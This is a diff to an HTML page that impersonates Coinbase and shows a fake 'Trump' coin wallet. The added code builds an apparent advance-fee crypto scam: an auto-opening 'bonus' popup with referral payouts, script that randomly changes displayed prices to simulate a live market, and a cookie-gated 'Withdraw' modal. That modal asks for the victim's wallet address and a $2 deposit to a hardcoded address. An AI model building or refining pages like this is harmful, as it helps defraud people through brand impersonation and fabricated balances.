@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>Coinbase</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
   <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css">
@@ -29,6 +29,7 @@
       background-color: #000;
       color: #fff;
       font-family: 'Inter', sans-serif;
+      user-select:none;
     }
     #coinbase_hd {
       width: 35px;
@@ -76,7 +77,7 @@
       color: #fff;
       transition: all 0.3s;
     }
-    .dropdown-item:hover {
+    .dropdown-item:active {
       background-color: gold;
       color: #000;
     }
@@ -92,12 +93,12 @@
       border-radius: 16px;
       padding: 2px 8px;
       background-color: #808080a6;
-      font-size: 5px;
+      font-size: 10px;
       color: #bfbfbfae;
       margin:0;
       position:relative;
-      top: -3px;
-      font-weight: 800;
+      top: -2.5px;
+      font-weight: 900;
       opacity:.7;
            
       
@@ -174,15 +175,17 @@
     .green{color:green;}.red{color:red;}
     
     
-    /* Custom styling for dark popup content */
-    .dark-content {
-      background-color: #222; /* Dark background */
-      color: #fff;          /* Light text for contrast */
-      padding: 20px;
-      border-radius: 8px;
-      font-size: 1.1rem;
-      text-align: center;
-    }
+    
+  /* General styling for dark modal */
+  .dark-content {
+    background-color: #222;
+    color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    font-size: 1.1rem;
+    text-align: center;
+  }
+
     .dark-content button {
       background-color: #444; /* Dark button */
       color: #fff;
@@ -197,8 +200,112 @@
     }
     .iziModal{
       width:80%;
+    }  
+
+  /* Styling for the form */
+  .wallet-form {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+
+  .wallet-form input[type="text"] {
+    width: 90%;
+    max-width: 400px;
+    padding: 10px;
+    border: 1px solid #444;
+    border-radius: 6px;
+    background-color: #333;
+    color: #fff;
+    font-size: 1rem;
+    outline: none;
+  }
+
+  .wallet-form input[type="text"]::placeholder {
+    color: #aaa;
+  }
+
+  .wallet-form input[type="submit"] {
+    padding: 10px 20px;
+    background-color: #444;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: background-color 0.3s ease;
+  }
+
+  .wallet-form input[type="submit"]:hover {
+    background-color: #666;
+  }
+
+  /* Styling for deposit address */
+  .depAddr {
+    font-weight: bold;
+    color: #0f7cdb; /* A slightly bright color for visibility */
+    background: #333;
+    padding: 5px 10px;
+    border-radius: 6px;
+    font-size: 1rem;
+    letter-spacing: 0.5px;
+  }
+
+  /* Copy icon styling */
+  #copyIt {
+    margin-left: 10px;
+    cursor: pointer;
+    color: #fff;
+    font-size: 1.2rem;
+    transition: color 0.3s ease;
+  }
+
+  #copyIt:hover {
+    color: #0f7cdb;
+  }
+
+  /* Close button */
+  .close-btn {
+    margin-top: 15px;
+    padding: 10px 20px;
+    background-color: #444;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: background-color 0.3s ease;
+  }
+
+  .close-btn:hover {
+    background-color: #666;
+  }
+
+  /* Hide label (for accessibility) */
+  .hidden-label {
+    position: absolute;
+    left: -9999px;
+  }
+  
+  .coin-defaults {
+    background-image: linear-gradient(45deg, gold, yellow, white, gray);
+    background-size: 200% auto;
+    color: transparent;
+    -webkit-background-clip: text;
+    animation: gradientAnimation 2s linear infinite;
     }
-  </style>
+  
+  @keyframes gradientAnimation {
+  to {
+    background-position: -200% center;
+    }
+  }
+
+</style>
+  
+  
 </head>
 <body>
   <!-- Wallet Header -->
@@ -224,7 +331,7 @@
   <!-- Balance Section -->
   <div class="balance-section">
     <h2>$25.01</h2>
-    <p><span id="wallet-address">0xA1Ed...3CB4E</span> <span class="coin-default">Trump</span></p>
+    <p><span id="wallet-address">0xA1Ed...3CB4E</span> <span class="coin-default"><span class="coin-defaults">Trump</span></span></p>
   </div>
 
   <!-- Action Buttons -->
@@ -234,7 +341,7 @@
       <span>Send</span>
     </div>
     <div class="action-item">
-      <button class="btn-circle open-btn" data-modal-id="darkModal2">
+      <button class="btn-circle open-withdraw" data-modal-id="darkModal2">
           <!-- 
           <i class="far fa-arrow-down-left"></i>
            -->
@@ -349,12 +456,12 @@
           <ol type="i" style="text-align:left;">
               <li>Share your copied referral link</li>
               <li>Join our channel for updates and reward</li>
-              <li>Complete the daily task posted to boost your earnings</li>.
+              <li>Complete the daily task posted to boost your earnings.</l>
           </ol>
           
       </p>
       <p>For more updates or enquires:</p>
-      <button class="close-btn"><a href="">Join our channel</a></button><button class="close-btn">back</button>
+      <button class="close-btn"><a href="">Join our channel</a></button> <button class="close-btn">back</button>
     </div>
   </div>
   
@@ -368,9 +475,41 @@
     </div>
   </div>
   
-  
-  
-  
+  <!-- Dark Popup Modal 6 -->
+  <div id="darkModal6" class="iziModal" data-izimodal-title="Update!!!">
+    <div class="dark-content">
+      <p><strong>Don't miss out</strong> on your special offer for this season
+The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $4430844387.08 USD is giving out a bonus for Trump lunch Trump coin be among the winners now by complete the task.</p>
+
+      <p>Share the link, and join our channel to get $2.5 per your referral!</p>
+      <p><strong><a style="color:green;" href="https://coinmarketcap.com/currencies/official-trump/">Read More &raquo;</a></strong></p>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
+   
+   <!-- Dark Popup Modal 7 -->
+   <div id="darkModal7" class="iziModal" data-izimodal-title="Withdraw">
+  <div class="dark-content">
+    <p>Enter your wallet address</p>
+    <p>
+      <form class="wallet-form">
+        <label for="wallet" class="hidden-label">Wallet Address</label>
+        <input type="text" id="wallet" placeholder="Enter Your Trump Wallet Address...">
+        <input type="submit" value="Continue">
+      </form>
+    </p>
+
+    <p>Kindly copy the wallet address below, and make a deposit of $2.</p>
+
+    <p>
+      <span class="depAddr">UQC1f5...Z0HfkO8aTDy</span>
+      <i class="far fa-copy" id="copyIt" title="Copy Address"></i>
+    </p>
+
+    <p><strong>Continue &raquo;</strong></p>
+    <button class="close-btn">Close</button>
+  </div>
+</div>  
   
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
@@ -379,8 +518,55 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/js/iziModal.min.js"></script>
 
+<script>
+  // Function to simulate real-time price fluctuation
+  const updatePrices = () => {
+    const cryptoCards = document.querySelectorAll('.crypto-card');
+    cryptoCards.forEach((card) => {
+      const priceElement = card.querySelector('.price p');
+      const currentPrice = parseFloat(priceElement.textContent.replace('$', ''));
+      // Randomly fluctuate price (small changes for realism)
+      const change = (Math.random() * 2 - 1).toFixed(2); // Random number between -1 and 1
+      const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2); // Avoid negative prices
+      // Update the price and add green/red class
+      priceElement.textContent = `$${newPrice}`;
+      priceElement.classList.remove('green', 'red');
+      if (change > 0) {
+        priceElement.classList.add('green');
+      } else if (change < 0) {
+        priceElement.classList.add('red');
+      }
+    });
+  };
+  // Update prices every 2 seconds
+  setInterval(updatePrices, 2000);
+</script>
+
+
   <script>
     $(document).ready(function() {
+     
+    document.addEventListener('click', function(event) {
+        if (event.target && event.target.id === 'copyIt') {
+            const tron_add = 'UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy';
+            const addrInput = document.createElement('input');
+            addrInput.value = tron_add;
+            addrInput.style.position = 'absolute';
+            addrInput.style.left = '-9999px';
+            document.body.appendChild(addrInput);
+            addrInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(addrInput);
+           iziToast.success({
+              title: "Copied!",
+              message: "Wallet Address copied to clipboard!",
+              duration: 3000,
+              position: "topRight",
+           });
+        }
+    });
+    
+    
       // Initialize all modals with the class `iziModal`
       $(".iziModal").each(function() {
         $(this).iziModal({
@@ -392,12 +578,28 @@
           transitionOut: 'fadeOutDown',
         });
       });
+      
+      // Call the initial modal6
+      $("#darkModal6").iziModal("open");
+      
+      
+      // 🔥🔥🔥🔥
 
+      
+      setTimeout(function(){$("#darkModal6").iziModal("close");}, 20000); // 20s Timeout for the initial update pop up.
+      
+            
       // Open modal dynamically based on button click
       $(".open-btn").on("click", function() {
+      
         const modalId = $(this).data("modal-id"); // Get the modal ID from button
+        
+        //get the user balance to check the threshold reached
+        
+        
         $("#" + modalId).iziModal("open"); // Open the modal with that ID
       });
+      
 
       // Close modal on button click inside the modal
       $(".close-btn").on("click", function() {
@@ -514,8 +716,32 @@ const walletAddress = `0xA1Ed...${randomEnding}`;
   
   onValue(balanceRef, (snapshot) => {
     const balance = parseFloat(snapshot.val());
+    
     document.querySelector('.balance-section h2').textContent = `$${balance.toFixed(2)}`;
+    
+
+// Set the balance to cookie
+  
+  document.cookie = `userBalance=${balance.toFixed(2)}; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
+  
   });
+  
+ //🔥🔥🔥🔥🔥 
+    const userBalanceCookie = document.cookie.split('; ').find(row => row.startsWith('userBalance='));
+const userBalance = userBalanceCookie ? parseFloat(userBalanceCookie.split('=')[1]) : null;
+
+if (userBalance >= 62.51) {
+   
+    $(".open-withdraw").on("click", function() {
+        $("#darkModal7").iziModal("open");
+      });
+       
+} else {
+$(".open-withdraw").on("click", function() {
+    $("#darkModal2").iziModal("open");
+    });
+}
+
   
   const walletAddr = ref(database, `users/${userId}/wallet`);
   
@@ -524,8 +750,9 @@ const walletAddress = `0xA1Ed...${randomEnding}`;
     const wallet = snapshot.val() || walletAddress;
     
 document.getElementById('wallet-address').textContent = wallet;
-    
+
   });
+  
 
   // Share button functionality
   const shareButton = document.getElementById('share-button');
